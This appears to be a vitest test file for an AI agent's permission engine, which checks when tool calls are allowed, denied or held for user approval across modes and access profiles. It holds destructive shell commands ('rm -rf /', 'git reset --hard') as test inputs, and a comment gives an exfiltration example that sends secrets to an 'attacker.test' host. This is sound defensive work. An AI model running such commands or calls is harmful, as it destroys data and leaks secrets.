import path from "node:path";
import { describe, expect, it } from "vitest";
import type { PermissionRule, Workspace } from "../../../../shared/types";
import { PermissionEngine } from "../PermissionEngine";

const workspace: Workspace = {
  id: "workspace-1",
  name: "Workspace",
  path: "/tmp/workspace",
  permissions: {
    read: true,
    write: true,
    delete: true,
    network: true,
    shell: true,
  },
  createdAt: Date.now(),
};

function evaluate(input: Partial<Parameters<typeof PermissionEngine.evaluate>[0]> = {}) {
  return PermissionEngine.evaluate({
    workspace,
    toolName: "read_file",
    mode: "default",
    rules: [],
    ...input,
  });
}

describe("PermissionEngine", () => {
  it("applies explicit tool rules", () => {
    const result = evaluate({
      toolName: "open_url",
      rules: [
        {
          source: "profile",
          effect: "deny",
          scope: { kind: "tool", toolName: "open_url" },
        },
      ],
    });

    expect(result.decision).toBe("deny");
    expect(result.reason.type).toBe("rule");
    expect(result.matchedRule?.source).toBe("profile");
  });

  it("prefers the most specific matching path rule", () => {
    const filePath = path.resolve("/tmp/workspace/src/runtime/engine.ts");
    const rules: PermissionRule[] = [
      {
        source: "profile",
        effect: "allow",
        scope: { kind: "path", toolName: "edit_file", path: "/tmp/workspace/src" },
      },
      {
        source: "workspace_db",
        effect: "deny",
        scope: { kind: "path", toolName: "edit_file", path: "/tmp/workspace/src/runtime" },
      },
    ];

    const result = evaluate({
      toolName: "edit_file",
      mode: "accept_edits",
      path: filePath,
      rules,
    });

    expect(result.decision).toBe("deny");
    expect(result.matchedRule?.source).toBe("workspace_db");
    expect(result.scopePreview).toContain(filePath);
  });

  it("matches normalized command prefixes", () => {
    const result = evaluate({
      toolName: "run_command",
      approvalType: "run_command",
      command: "git    status   --short",
      rules: [
        {
          source: "session",
          effect: "allow",
          scope: { kind: "command_prefix", prefix: "git status" },
        },
      ],
    });

    expect(result.decision).toBe("allow");
    expect(result.matchedRule?.scope.kind).toBe("command_prefix");
  });

  it("prefers a more specific rule over a higher-priority source", () => {
    const result = evaluate({
      toolName: "run_command",
      approvalType: "run_command",
      command: "git status --short",
      rules: [
        {
          source: "session",
          effect: "allow",
          scope: { kind: "command_prefix", prefix: "git status" },
        },
        {
          source: "workspace_db",
          effect: "deny",
          scope: { kind: "command_prefix", prefix: "git status --short" },
        },
      ],
    });

    expect(result.decision).toBe("deny");
    expect(result.matchedRule).toEqual(
      expect.objectContaining({
        source: "workspace_db",
        effect: "deny",
      }),
    );
  });

  it("matches MCP server rules", () => {
    const result = evaluate({
      toolName: "mcp_fetch_issue",
      serverName: "GitHub",
      rules: [
        {
          source: "workspace_manifest",
          effect: "deny",
          scope: { kind: "mcp_server", serverName: "github" },
        },
      ],
    });

    expect(result.decision).toBe("deny");
    expect(result.matchedRule?.scope.kind).toBe("mcp_server");
  });

  it("uses mode defaults when no explicit rule matches", () => {
    expect(
      evaluate({
        toolName: "read_file",
        mode: "plan",
      }).decision,
    ).toBe("allow");

    expect(
      evaluate({
        toolName: "edit_file",
        mode: "plan",
      }).decision,
    ).toBe("deny");

    expect(
      evaluate({
        toolName: "edit_file",
        mode: "accept_edits",
      }).decision,
    ).toBe("allow");

    expect(
      evaluate({
        toolName: "edit_file",
        mode: "dangerous_only",
      }).decision,
    ).toBe("allow");

    expect(
      evaluate({
        toolName: "open_url",
        mode: "default",
      }).decision,
    ).toBe("ask");

    expect(
      evaluate({
        toolName: "open_url",
        mode: "dont_ask",
      }).decision,
    ).toBe("allow");

    expect(
      evaluate({
        toolName: "open_url",
        mode: "bypass_permissions",
      }).decision,
    ).toBe("allow");

    expect(
      evaluate({
        toolName: "http_request",
        approvalType: "data_export",
        mode: "dont_ask",
        toolInput: {
          url: "https://api.example.com/export",
          method: "POST",
          body: "payload",
        },
      }).decision,
    ).toBe("ask");
  });

  it("allows approval-gated actions in bypass-permissions mode", () => {
    const cases = [
      evaluate({
        toolName: "run_command",
        approvalType: "run_command",
        command: "npm run build",
        mode: "bypass_permissions",
      }),
      evaluate({
        toolName: "gmail_action",
        approvalType: "external_service",
        mode: "bypass_permissions",
      }),
      evaluate({
        toolName: "http_request",
        approvalType: "data_export",
        mode: "bypass_permissions",
        toolInput: {
          url: "https://api.example.com/export",
          method: "POST",
          body: "payload",
        },
      }),
    ];

    expect(cases.map((result) => result.decision)).toEqual(["allow", "allow", "ask"]);
  });

  it("keeps protected credential actions explicitly approved and out of recurring suggestions", () => {
    for (const mode of ["default", "dont_ask", "bypass_permissions"] as const) {
      const result = evaluate({
        toolName: "http_request",
        approvalType: "protected_credential",
        mode,
        toolInput: {
          url: "https://api.example.com/items",
          credentialId: "credential-1",
        },
      });

      expect(result.decision).toBe("ask");
      expect(result.suggestions.map((suggestion) => suggestion.action)).not.toContain(
        "allow_recurring",
      );
    }
  });

  it("allows safe commands and read-only tools in dangerous_only mode", () => {
    expect(
      evaluate({
        toolName: "run_command",
        approvalType: "run_command",
        command: "npm test -- --runInBand",
        mode: "dangerous_only",
      }).decision,
    ).toBe("allow");

    expect(
      evaluate({
        toolName: "read_file",
        mode: "dangerous_only",
      }).decision,
    ).toBe("allow");
  });

  it("prompts for privacy-sensitive or ambiguous reads in dangerous_only mode", () => {
    expect(
      evaluate({
        toolName: "read_clipboard",
        mode: "dangerous_only",
      }).decision,
    ).toBe("ask");

    expect(
      evaluate({
        toolName: "browser_get_content",
        mode: "dangerous_only",
      }).decision,
    ).toBe("ask");

    expect(
      evaluate({
        toolName: "screenshot",
        approvalType: "computer_use",
        mode: "dangerous_only",
      }).decision,
    ).toBe("ask");
  });

  it("prompts for destructive or ambiguous actions in dangerous_only mode", () => {
    expect(
      evaluate({
        toolName: "delete_file",
        approvalType: "delete_file",
        mode: "dangerous_only",
      }).decision,
    ).toBe("ask");

    expect(
      evaluate({
        toolName: "run_command",
        approvalType: "run_command",
        command: "rm -rf dist",
        mode: "dangerous_only",
      }).decision,
    ).toBe("ask");

    expect(
      evaluate({
        toolName: "http_request",
        toolInput: {
          url: "https://example.com/api",
          method: "POST",
        },
        mode: "dangerous_only",
      }).decision,
    ).toBe("ask");

    expect(
      evaluate({
        toolName: "mcp_fetch_issue",
        serverName: "github",
        mode: "dangerous_only",
      }).decision,
    ).toBe("ask");

    expect(
      evaluate({
        toolName: "run_applescript",
        mode: "dangerous_only",
      }).decision,
    ).toBe("ask");

    expect(
      evaluate({
        toolName: "run_command",
        approvalType: "run_command",
        command: "npm install",
        mode: "dangerous_only",
      }).decision,
    ).toBe("ask");

    expect(
      evaluate({
        toolName: "file_tools",
        approvalType: "external_file_access",
        mode: "dangerous_only",
        path: "/tmp/external-output.txt",
      }).decision,
    ).toBe("ask");
  });

  it("allows read-only network tools in default mode when network permission is enabled", () => {
    const result = evaluate({
      toolName: "web_fetch",
      mode: "default",
    });

    expect(result.decision).toBe("allow");
    expect(result.reason.type).toBe("mode");
  });

  it("prompts for one-time location access by default and disables persistent suggestions", () => {
    const result = evaluate({
      toolName: "get_current_location",
      approvalType: "location_access",
      mode: "default",
      allowPersistence: false,
    });

    expect(result.decision).toBe("ask");
    expect(result.scopePreview).toContain("get_current_location");
    expect(result.suggestions.map((entry) => entry.action)).toEqual(["deny_once", "allow_once"]);
  });

  it("does not allow location access through persisted rules or bypass modes", () => {
    const rules: PermissionRule[] = [
      {
        source: "session",
        effect: "allow",
        scope: { kind: "tool", toolName: "get_current_location" },
      },
    ];

    for (const mode of ["dont_ask", "bypass_permissions"] as const) {
      const result = evaluate({
        toolName: "get_current_location",
        approvalType: "location_access",
        mode,
        rules,
      });

      expect(result.decision).toBe("ask");
      expect(result.matchedRule).toBeUndefined();
      expect(result.suggestions.map((entry) => entry.action)).toEqual(["deny_once", "allow_once"]);
    }
  });

  it("denies location access when workspace network capability is disabled", () => {
    const result = evaluate({
      workspace: {
        ...workspace,
        permissions: {
          ...workspace.permissions,
          network: false,
        },
      },
      toolName: "get_current_location",
      approvalType: "location_access",
      mode: "default",
    });

    expect(result.decision).toBe("deny");
    expect(result.reason.type).toBe("workspace_capability");
    expect(result.reason.summary).toContain("network");
  });

  it("still enforces workspace network permission for network read tools", () => {
    const result = evaluate({
      workspace: {
        ...workspace,
        permissions: {
          ...workspace.permissions,
          network: false,
        },
      },
      toolName: "web_fetch",
      mode: "default",
    });

    expect(result.decision).toBe("deny");
    expect(result.reason.type).toBe("workspace_capability");
    expect(result.reason.summary).toContain("network");
  });

  it("requires approval for every external surface when the profile is on-request", () => {
    for (const toolName of ["web_search", "x_search", "open_url", "mcp_fetch_issue"]) {
      const result = evaluate({
        toolName,
        mode: "bypass_permissions",
        workspace: {
          ...workspace,
          permissions: { ...workspace.permissions, accessNetworkMode: "on-request" },
        },
        toolInput:
          toolName === "open_url"
            ? { url: "https://example.com" }
            : toolName === "web_search"
              ? { query: "example" }
              : undefined,
      });

      expect(result.decision, toolName).toBe("ask");
      expect(result.reason.type, toolName).toBe("workspace_capability");
    }
  });

  it("keeps an explicit network deny ahead of an on-request profile boundary", () => {
    const result = evaluate({
      toolName: "web_fetch",
      mode: "bypass_permissions",
      workspace: {
        ...workspace,
        permissions: { ...workspace.permissions, accessNetworkMode: "on-request" },
      },
      rules: [
        {
          source: "profile",
          effect: "deny",
          scope: { kind: "tool", toolName: "web_fetch" },
        },
      ],
    });

    expect(result.decision).toBe("deny");
    expect(result.reason.type).toBe("rule");
  });

  it("classifies network-capable tool groups as network access", () => {
    for (const toolName of [
      "generate_image",
      "generate_video",
      "scrape_page",
      "youtube_ingest_video",
    ]) {
      const result = evaluate({
        toolName,
        mode: "bypass_permissions",
        workspace: {
          ...workspace,
          permissions: { ...workspace.permissions, accessNetworkMode: "on-request" },
        },
      });

      expect(result.decision, toolName).toBe("ask");
      expect(result.reason.type, toolName).toBe("workspace_capability");
    }
  });

  it("treats execute_code allow_network as a network capability request", () => {
    const onRequest = evaluate({
      toolName: "execute_code",
      approvalType: "network_access",
      mode: "default",
      toolInput: { language: "javascript", code: "fetch(url)", allow_network: true },
      workspace: {
        ...workspace,
        permissions: { ...workspace.permissions, accessNetworkMode: "on-request" },
      },
    });
    expect(onRequest.decision).toBe("ask");
    expect(onRequest.reason.type).toBe("workspace_capability");

    const disabled = evaluate({
      toolName: "execute_code",
      approvalType: "network_access",
      mode: "bypass_permissions",
      toolInput: { language: "javascript", code: "fetch(url)", allow_network: true },
      workspace: {
        ...workspace,
        permissions: { ...workspace.permissions, accessNetworkMode: "disabled" },
      },
    });
    expect(disabled.decision).toBe("deny");
    expect(disabled.reason.type).toBe("workspace_capability");
  });

  it("treats GET http_request as read-only network access in default mode", () => {
    const result = evaluate({
      toolName: "http_request",
      mode: "default",
      toolInput: {
        url: "https://example.com/api",
        method: "GET",
      },
    });

    expect(result.decision).toBe("allow");
    expect(result.reason.type).toBe("mode");
  });

  it("treats mutating http_request methods as approval-worthy external side effects", () => {
    const result = evaluate({
      toolName: "http_request",
      approvalType: "data_export",
      mode: "default",
      toolInput: {
        url: "https://example.com/api",
        method: "POST",
        body: '{"name":"test"}',
      },
    });

    expect(result.decision).toBe("ask");
    expect(result.reason.type).toBe("mode");
    expect(result.suggestions.some((entry) => entry.action === "allow_profile")).toBe(false);
  });

  it("infers a domain scope for network and export requests", () => {
    const readResult = evaluate({
      toolName: "web_fetch",
      approvalType: "network_access",
      mode: "default",
      toolInput: {
        url: "https://docs.example.com/page",
      },
    });
    const exportResult = evaluate({
      toolName: "http_request",
      approvalType: "data_export",
      mode: "default",
      toolInput: {
        url: "https://api.example.com/export",
        method: "POST",
        body: "payload",
      },
      rules: [
        {
          source: "session",
          effect: "allow",
          scope: {
            kind: "domain",
            toolName: "http_request",
            domain: "api.example.com",
          },
        },
      ],
    });

    expect(
      PermissionEngine.inferScope({
        workspace,
        toolName: "web_fetch",
        approvalType: "network_access",
        mode: "default",
        rules: [],
        toolInput: { url: "https://docs.example.com/page" },
      }),
    ).toEqual({
      kind: "domain",
      toolName: "web_fetch",
      domain: "docs.example.com",
    });
    expect(exportResult.decision).toBe("allow");
    expect(readResult.scopePreview).toContain("docs.example.com");
  });

  it("matches browser domain rules by tool prefix without granting unrelated tools", () => {
    const rules: PermissionRule[] = [
      {
        source: "session",
        effect: "allow",
        scope: {
          kind: "domain",
          domain: "github.com",
          toolPrefix: "browser_",
        },
      },
    ];

    for (const toolName of ["browser_navigate", "browser_click", "browser_fill"]) {
      const result = evaluate({
        toolName,
        approvalType: "network_access",
        mode: "default",
        toolInput: { url: "https://github.com/openai/codex" },
        rules,
      });

      expect(result.decision).toBe("allow");
      expect(result.matchedRule?.scope).toEqual({
        kind: "domain",
        domain: "github.com",
        toolPrefix: "browser_",
      });
    }

    for (const toolName of ["web_fetch", "http_request", "open_url"]) {
      const result = evaluate({
        toolName,
        approvalType: "network_access",
        mode: "default",
        toolInput: { url: "https://github.com/openai/codex" },
        rules,
      });

      expect(result.matchedRule).toBeUndefined();
    }
  });

  it("infers browser domain approvals as browser-only domain rules", () => {
    expect(
      PermissionEngine.inferScope({
        workspace,
        toolName: "browser_navigate",
        approvalType: "network_access",
        mode: "default",
        rules: [],
        toolInput: { url: "https://github.com/openai/codex" },
      }),
    ).toEqual({
      kind: "domain",
      domain: "github.com",
      toolPrefix: "browser_",
    });
  });

  it("keeps workspace network blocks hard for Browser Use domain access", () => {
    const result = evaluate({
      workspace: {
        ...workspace,
        permissions: {
          ...workspace.permissions,
          network: false,
        },
      },
      toolName: "browser_navigate",
      approvalType: "network_access",
      mode: "default",
      toolInput: { url: "https://github.com/openai/codex" },
    });

    expect(result.decision).toBe("deny");
    expect(result.reason.type).toBe("workspace_capability");
    expect(result.reason.summary).toContain("network");
  });

  it("treats browser navigation as a mutating action in default mode", () => {
    const result = evaluate({
      toolName: "browser_navigate",
      mode: "default",
    });

    expect(result.decision).toBe("ask");
    expect(result.reason.type).toBe("mode");
  });

  it("prompts for non-workspace browser and system tools in accept_edits mode", () => {
    expect(
      evaluate({
        toolName: "browser_navigate",
        mode: "accept_edits",
      }).decision,
    ).toBe("ask");

    expect(
      evaluate({
        toolName: "canvas_snapshot",
        mode: "accept_edits",
      }).decision,
    ).toBe("ask");

    expect(
      evaluate({
        toolName: "open_url",
        mode: "accept_edits",
      }).decision,
    ).toBe("ask");

    expect(
      evaluate({
        toolName: "screenshot",
        mode: "accept_edits",
        approvalType: "computer_use",
      }).decision,
    ).toBe("ask");
  });

  it("prompts for read-only browser and system tools in default mode", () => {
    expect(
      evaluate({
        toolName: "browser_get_content",
        mode: "default",
      }).decision,
    ).toBe("ask");

    expect(
      evaluate({
        toolName: "read_clipboard",
        mode: "default",
      }).decision,
    ).toBe("ask");
  });

  it("does not treat read-only system tools as workspace writes", () => {
    const result = evaluate({
      workspace: {
        ...workspace,
        permissions: {
          ...workspace.permissions,
          write: false,
        },
      },
      toolName: "read_clipboard",
      mode: "default",
    });

    expect(result.decision).toBe("ask");
    expect(result.reason.type).toBe("mode");
  });

  it("treats generated documents as file mutations in default mode", () => {
    const result = evaluate({
      toolName: "generate_document",
      mode: "default",
    });

    expect(result.decision).toBe("ask");
    expect(result.reason.type).toBe("mode");
  });

  it("keeps legacy mode authority when copied profile fields lack an authority marker", () => {
    const legacyWorkspace = {
      ...workspace,
      permissions: {
        ...workspace.permissions,
        accessSandboxMode: "read-only" as const,
        accessApprovalPolicy: "never" as const,
        accessNetworkMode: "disabled" as const,
      },
    };

    const result = evaluate({
      workspace: legacyWorkspace,
      toolName: "write_file",
      mode: "bypass_permissions",
      toolInput: { path: "notes.txt" },
    });

    expect(result.decision).toBe("allow");
    expect(result.reason.type).toBe("mode");
  });

  it("hard-denies scoped filesystem escapes before they can become approval prompts", () => {
    const scopedWorkspace = {
      ...workspace,
      permissions: {
        ...workspace.permissions,
        accessProfileId: "project_sources",
        accessProfileScoped: true,
        accessFilesystemScoped: true,
        accessWorkspaceRoots: ["."],
      },
    };

    for (const input of [
      { toolName: "read_file", toolInput: { path: "../outside.txt" } },
      {
        toolName: "write_file",
        approvalType: "external_file_access" as const,
        toolInput: { path: "../outside.txt" },
      },
      { toolName: "create_document", toolInput: { filename: "../outside.docx" } },
    ]) {
      const result = evaluate({
        workspace: scopedWorkspace,
        mode: "default",
        ...input,
      });

      expect(result.decision).toBe("deny");
      expect(result.reason.type).toBe("workspace_capability");
      expect(result.reason.summary).toContain("Filesystem access denied");
      expect(result.reason.metadata).toEqual(
        expect.objectContaining({ policyReason: "profile_filesystem_outside" }),
      );
    }
  });

  it("hard-denies protected mutation paths without asking for approval", () => {
    const result = evaluate({
      toolName: "write_file",
      approvalType: "external_file_access",
      mode: "dont_ask",
      toolInput: { path: "/etc/cowork-edge-case.conf" },
    });

    expect(result.decision).toBe("deny");
    expect(result.reason.type).toBe("workspace_capability");
    expect(result.reason.metadata).toEqual(
      expect.objectContaining({ policyReason: "protected_path" }),
    );
  });

  it("switches repeated soft denials into explicit prompts", () => {
    const result = evaluate({
      toolName: "open_url",
      mode: "plan",
      denyState: {
        consecutiveDenials: 3,
        totalDenials: 3,
      },
    });

    expect(result.decision).toBe("ask");
    expect(result.reason.type).toBe("denial_fallback");
  });

  it("does not fallback hard guardrail denials", () => {
    const result = evaluate({
      toolName: "run_command",
      approvalType: "run_command",
      command: "rm -rf /",
      denyState: {
        consecutiveDenials: 99,
        totalDenials: 99,
      },
    });

    expect(result.decision).toBe("deny");
    expect(result.reason.type).toBe("guardrail");
  });

  describe("named access profile boundaries", () => {
    const namedWorkspace = (overrides: Partial<Workspace["permissions"]> = {}): Workspace => ({
      ...workspace,
      isTemp: true,
      permissions: {
        ...workspace.permissions,
        accessProfileId: "bounded",
        accessSandboxMode: "workspace-write",
        accessApprovalPolicy: "on-request",
        accessReviewer: "user",
        accessNetworkMode: "on-request",
        ...overrides,
      },
    });

    it.each(["rm -rf ./build", "git reset --hard"])(
      "retains explicit consent for destructive or privileged shell action %s",
      (command) => {
        expect(
          evaluate({
            workspace: namedWorkspace(),
            toolName: "run_command",
            command,
            approvalType: "run_command",
          }).decision,
        ).toBe("ask");
        expect(
          evaluate({
            workspace: namedWorkspace({ accessApprovalPolicy: "never" }),
            toolName: "run_command",
            command,
            approvalType: "run_command",
          }).decision,
        ).toBe("deny");
      },
    );

    it.each([
      ["workspace write", { toolName: "write_file", toolInput: { path: "notes.txt" } }],
      [
        "generated artifact",
        { toolName: "generate_document", toolInput: { filename: "note.docx" } },
      ],
      [
        "routine sandboxed command",
        { toolName: "run_command", approvalType: "run_command" as const, command: "npm test" },
      ],
    ])("allows an in-scope %s without a review", (_label, input) => {
      const result = evaluate({
        ...input,
        workspace: namedWorkspace(),
        // The named profile is authoritative even if a legacy caller passes
        // the old prompting mode.
        mode: "default",
      });

      expect(result.decision).toBe("allow");
      expect(result.reason.type).toBe("other");
    });

    it("treats user and automatic reviewers identically for the same non-read boundary", () => {
      const user = evaluate({
        workspace: namedWorkspace({ accessReviewer: "user" }),
        toolName: "open_url",
        mode: "bypass_permissions",
        toolInput: { url: "https://docs.example.com/page" },
      });
      const automatic = evaluate({
        workspace: namedWorkspace({ accessReviewer: "auto-review" }),
        toolName: "open_url",
        mode: "bypass_permissions",
        toolInput: { url: "https://docs.example.com/page" },
      });

      expect(user.decision).toBe("ask");
      expect(automatic.decision).toBe(user.decision);
    });

    // A profile declaring `network: "on-request"` asks before ANY internet
    // access, reads included. web_fetch is the canonical exfiltration
    // primitive — `web_fetch("https://attacker.test/?d=<secrets>")` is a read —
    // so exempting it under the profile whose stated purpose is asking first
    // defeats the profile.
    it("prompts for read-only web lookups when the profile asks on request", () => {
      for (const [toolName, toolInput] of [
        ["web_search", { query: "Jev" }],
        ["web_fetch", { url: "https://docs.example.com/page" }],
        ["x_search", { query: "Jev" }],
        ["http_request", { url: "https://docs.example.com/page", method: "GET" }],
      ] as const) {
        const result = evaluate({
          workspace: namedWorkspace(),
          toolName,
          mode: "bypass_permissions",
          toolInput,
        });

        expect(result.decision, toolName).toBe("ask");
      }
    });

    it("allows routine read-only web lookups when the profile enables network", () => {
      for (const [toolName, toolInput] of [
        ["web_search", { query: "Jev" }],
        ["web_fetch", { url: "https://docs.example.com/page" }],
        ["x_search", { query: "Jev" }],
        ["http_request", { url: "https://docs.example.com/page", method: "GET" }],
      ] as const) {
        const result = evaluate({
          workspace: namedWorkspace({ accessNetworkMode: "enabled" }),
          toolName,
          mode: "bypass_permissions",
          toolInput,
        });

        expect(result.decision, toolName).toBe("allow");
      }
    });

    it("keeps credential-backed web reads behind explicit consent", () => {
      const result = evaluate({
        workspace: namedWorkspace(),
        toolName: "web_fetch",
        mode: "bypass_permissions",
        toolInput: {
          url: "https://docs.example.com/private",
          credentialId: "credential-1",
        },
      });

      expect(result.decision).toBe("ask");
      expect(result.reason.summary).toContain("internet");
    });

    it("allows an explicit network grant through an on-request profile", () => {
      const result = evaluate({
        workspace: namedWorkspace(),
        toolName: "web_fetch",
        mode: "default",
        toolInput: { url: "https://docs.example.com/page" },
        rules: [
          {
            source: "session",
            effect: "allow",
            scope: { kind: "domain", toolName: "web_fetch", domain: "docs.example.com" },
          },
        ],
      });

      expect(result.decision).toBe("allow");
      expect(result.matchedRule?.effect).toBe("allow");
    });

    it("allows a profile domain grant without a second network prompt", () => {
      const result = evaluate({
        workspace: namedWorkspace({
          accessDomainRules: [{ pattern: "docs.example.com", access: "allow" }],
        }),
        toolName: "web_fetch",
        mode: "default",
        toolInput: { url: "https://docs.example.com/page" },
      });

      expect(result.decision).toBe("allow");
    });

    it("keeps a profile domain ceiling ahead of a broad session grant", () => {
      const result = evaluate({
        workspace: namedWorkspace({
          accessDomainRules: [{ pattern: "docs.example.com", access: "allow" }],
        }),
        toolName: "web_fetch",
        mode: "default",
        toolInput: { url: "https://api.example.com/page" },
        rules: [
          {
            source: "session",
            effect: "allow",
            scope: { kind: "tool", toolName: "web_fetch" },
          },
        ],
      });

      expect(result.decision).toBe("deny");
      expect(result.reason.metadata).toEqual(
        expect.objectContaining({ policyReason: "profile_domain_not_allowed" }),
      );
    });

    it("keeps routine reads available under never while retaining explicit grants", () => {
      const neverWorkspace = namedWorkspace({
        accessApprovalPolicy: "never",
        accessNetworkMode: "on-request",
      });
      const missingNetwork = evaluate({
        workspace: neverWorkspace,
        toolName: "web_fetch",
        mode: "default",
        toolInput: { url: "https://docs.example.com/page" },
      });
      const grantedNetwork = evaluate({
        workspace: neverWorkspace,
        toolName: "web_fetch",
        mode: "default",
        toolInput: { url: "https://docs.example.com/page" },
        rules: [
          {
            source: "session",
            effect: "allow",
            scope: { kind: "domain", toolName: "web_fetch", domain: "docs.example.com" },
          },
        ],
      });

      // `network: "on-request"` still gates an ungranted read even when the
      // approval policy is "never" — the profile asked to decide per domain.
      // An explicit domain allow rule remains the way to grant one.
      expect(missingNetwork.decision).not.toBe("allow");
      expect(grantedNetwork.decision).toBe("allow");
    });

    it("preserves explicit ask rules and genuine consent gates", () => {
      const askWorkspace = namedWorkspace();
      const explicitAsk = evaluate({
        workspace: askWorkspace,
        toolName: "write_file",
        mode: "default",
        toolInput: { path: "notes.txt" },
        rules: [
          {
            source: "profile",
            effect: "ask",
            scope: { kind: "tool", toolName: "write_file" },
          },
        ],
      });
      const connectorConsent = evaluate({
        workspace: askWorkspace,
        toolName: "calendar_action",
        approvalType: "external_service",
        mode: "bypass_permissions",
      });
      const neverConsent = evaluate({
        workspace: namedWorkspace({ accessApprovalPolicy: "never", accessNetworkMode: "enabled" }),
        toolName: "calendar_action",
        approvalType: "external_service",
        mode: "bypass_permissions",
      });

      expect(explicitAsk.decision).toBe("ask");
      expect(connectorConsent.decision).toBe("ask");
      expect(neverConsent.decision).toBe("deny");
      expect(neverConsent.suggestions).toEqual([]);
    });

    it.each([
      ["risk gate", "risk_gate" as const, "run_command"],
      ["delete", "delete_file" as const, "delete_file"],
      ["data export", "data_export" as const, "http_request"],
      ["protected credential", "protected_credential" as const, "http_request"],
      ["location", "location_access" as const, "get_current_location"],
    ])("does not silently bypass %s consent in Full access", (_label, approvalType, toolName) => {
      const result = evaluate({
        workspace: namedWorkspace({
          accessSandboxMode: "danger-full-access",
          accessApprovalPolicy: "never",
          accessReviewer: "none",
          accessNetworkMode: "enabled",
        }),
        toolName,
        approvalType,
        mode: "bypass_permissions",
        ...(toolName === "http_request"
          ? { toolInput: { url: "https://api.example.com/items", method: "POST" } }
          : {}),
      });

      expect(result.decision).toBe("deny");
    });

    it("keeps a bounded temporary session root usable without a review", () => {
      const temporaryRoot = "/tmp/workspace/session-scratch";
      const result = evaluate({
        workspace: {
          ...namedWorkspace(),
          path: temporaryRoot,
        },
        toolName: "write_file",
        mode: "default",
        toolInput: { path: "scribe-conversation.md" },
      });

      expect(result.decision).toBe("allow");
    });

    it("keeps a danger-full sandbox independent from an on-request consent policy", () => {
      const result = evaluate({
        workspace: namedWorkspace({
          accessSandboxMode: "danger-full-access",
          accessApprovalPolicy: "on-request",
          accessReviewer: "user",
          accessNetworkMode: "enabled",
          unrestrictedFileAccess: true,
        }),
        toolName: "write_file",
        mode: "default",
        toolInput: { path: "/tmp/other-session/output.txt" },
      });

      expect(result.decision).toBe("allow");
    });

    it("hard-denies a read-only profile before an allow rule can widen it", () => {
      const result = evaluate({
        workspace: namedWorkspace({
          accessSandboxMode: "read-only",
          accessNetworkMode: "disabled",
          write: true,
          delete: true,
          shell: true,
        }),
        toolName: "write_file",
        mode: "bypass_permissions",
        toolInput: { path: "notes.txt" },
        rules: [
          {
            source: "session",
            effect: "allow",
            scope: { kind: "tool", toolName: "write_file" },
          },
        ],
      });

      expect(result.decision).toBe("deny");
      expect(result.reason.summary).toContain("read-only");
    });

    it("keeps read-only external reads on the explicit-consent path", () => {
      const outside = "/tmp/other-session/reference.txt";
      const result = evaluate({
        workspace: namedWorkspace({
          accessSandboxMode: "read-only",
          accessNetworkMode: "disabled",
        }),
        toolName: "read_file",
        approvalType: "external_file_access",
        mode: "default",
        path: outside,
        toolInput: { path: outside },
      });

      expect(result.decision).toBe("ask");
      expect(result.reason.summary).toContain("explicit consent");
    });

    it("asks for an unscoped external file exception and denies it under never", () => {
      const outside = "/tmp/other-session/output.txt";
      const request = {
        toolName: "write_file",
        approvalType: "external_file_access" as const,
        mode: "default" as const,
        path: outside,
        toolInput: { path: outside },
      };

      expect(evaluate({ ...request, workspace: namedWorkspace() }).decision).toBe("ask");
      expect(
        evaluate({
          ...request,
          workspace: namedWorkspace({ accessApprovalPolicy: "never" }),
        }).decision,
      ).toBe("deny");
    });

    it("supports the legacy and shadow rollout gates without widening a named profile", () => {
      const request = {
        workspace: namedWorkspace(),
        toolName: "write_file",
        mode: "default" as const,
        rules: [],
        toolInput: { path: "notes.txt" },
      };
      const previous = process.env.COWORK_ACCESS_POLICY_VERSION;
      try {
        process.env.COWORK_ACCESS_POLICY_VERSION = "legacy";
        const legacy = PermissionEngine.evaluate(request);
        expect(legacy.decision).toBe("ask");
        expect(legacy.metadata).toEqual(
          expect.objectContaining({ accessPolicyVersion: "legacy", namedBoundary: false }),
        );

        process.env.COWORK_ACCESS_POLICY_VERSION = "boundary";
        const boundary = PermissionEngine.evaluate(request);
        expect(boundary.decision).toBe("allow");
        expect(boundary.metadata).toEqual(
          expect.objectContaining({ accessPolicyVersion: "boundary", namedBoundary: true }),
        );

        process.env.COWORK_ACCESS_POLICY_VERSION = "shadow";
        const shadow = PermissionEngine.evaluate(request);
        expect(shadow.decision).toBe("ask");
        expect(shadow.metadata).toEqual(
          expect.objectContaining({
            accessPolicyVersion: "shadow",
            boundaryDecision: "allow",
            boundaryPolicyVersion: "boundary",
          }),
        );
      } finally {
        if (previous === undefined) delete process.env.COWORK_ACCESS_POLICY_VERSION;
        else process.env.COWORK_ACCESS_POLICY_VERSION = previous;
      }
    });
  });
});
